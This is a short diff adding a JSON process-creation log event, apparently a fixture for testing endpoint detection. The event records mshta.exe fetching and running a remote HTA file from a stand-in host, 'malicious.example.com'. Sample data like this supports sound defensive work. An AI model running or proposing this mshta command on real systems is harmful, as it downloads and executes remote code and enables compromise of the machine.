@@ -1,0 +1,9 @@
+{
+  "EventType": "ProcessCreate",
+  "Timestamp": "2025-01-12T16:21:38Z",
+  "Host": "WIN-SALES-04",
+  "User": "CORP\\david",
+  "SourceImage": "C:\\Windows\\System32\\mshta.exe",
+  "CommandLine": "mshta.exe http://malicious.example.com/update.hta",
+  "ParentImage": "C:\\Windows\\explorer.exe"
+}
